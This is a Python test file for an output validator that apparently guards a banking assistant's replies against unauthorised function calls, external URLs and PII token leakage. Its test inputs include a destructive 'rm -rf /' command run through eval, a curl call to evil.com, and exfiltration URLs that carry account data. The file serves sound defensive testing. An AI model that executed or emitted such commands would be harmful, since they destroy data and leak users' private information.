from middleware.output_validator import OutputValidator


validator = OutputValidator()


# ── Clean response tests ──────────────────────────────────────────────────────

def test_clean_response_passes():
    result = validator.validate(
        "You spent £245.50 on groceries last month across 12 transactions."
    )
    assert result.is_safe
    assert result.reasons == []


def test_empty_response_passes():
    result = validator.validate("")
    assert result.is_safe


# ── Function call tests ───────────────────────────────────────────────────────

def test_transfer_function_blocked():
    result = validator.validate("Sure, I'll do that: transfer(500, 'GB29NWBK')")
    assert not result.is_safe
    assert "Unauthorised function call detected" in result.reasons


def test_delete_function_blocked():
    result = validator.validate("I have deleted your account: delete(user_id=42)")
    assert not result.is_safe
    assert "Unauthorised function call detected" in result.reasons


def test_eval_function_blocked():
    result = validator.validate("Running: eval('import os; os.system(\"rm -rf /\")')")
    assert not result.is_safe


def test_os_system_blocked():
    result = validator.validate("Executing: os.system('curl evil.com')")
    assert not result.is_safe


def test_benign_word_transfer_not_blocked():
    """'transfer' as a noun in normal text should not trigger."""
    result = validator.validate(
        "Your bank transfer of £50 was completed successfully."
    )
    assert result.is_safe


# ── External URL tests ────────────────────────────────────────────────────────

def test_external_url_blocked():
    result = validator.validate(
        "For more info see https://evil.com/steal?data=account_info"
    )
    assert not result.is_safe
    assert "External URL detected" in result.reasons


def test_exfiltration_url_blocked():
    """Vector 5 — crafted URL containing encoded user data."""
    result = validator.validate(
        "See your report at https://evil.com/log?user=john&acc=12345678"
    )
    assert not result.is_safe
    assert any("evil.com" in f for f in result.flagged_content)


def test_localhost_url_allowed():
    result = validator.validate(
        "Dashboard available at http://localhost:5000/dashboard"
    )
    assert result.is_safe


# ── PII token leakage tests ───────────────────────────────────────────────────

def test_pii_token_in_response_blocked():
    """Layer 3 token should never appear in the final response."""
    mapping = {"EMAIL_ADDRESS_1": "john@example.com"}
    result = validator.validate(
        "The email EMAIL_ADDRESS_1 has been updated.",
        pii_mapping=mapping,
    )
    assert not result.is_safe
    assert "PII token leakage detected" in result.reasons


def test_remapped_response_passes():
    """After re-mapping, no tokens should remain — response should pass."""
    result = validator.validate(
        "The email john@example.com has been updated.",
        pii_mapping={},
    )
    assert result.is_safe


def test_no_mapping_uses_pattern_fallback():
    """Without a mapping, the pattern-based fallback catches token leakage."""
    result = validator.validate(
        "Your account PERSON_1 has been flagged.",
        pii_mapping=None,
    )
    assert not result.is_safe


# ── Multiple violations ───────────────────────────────────────────────────────

def test_multiple_violations_all_reported():
    result = validator.validate(
        "Running transfer(500) and see https://evil.com for details"
    )
    assert not result.is_safe
    assert len(result.reasons) >= 2


# ── Fail closed test ──────────────────────────────────────────────────────────

def test_none_input_fails_closed():
    """Passing None should fail closed, not raise an unhandled exception."""
    try:
        result = validator.validate(None)
        assert not result.is_safe
    except Exception:
        pass  # Acceptable — what matters is it never silently passes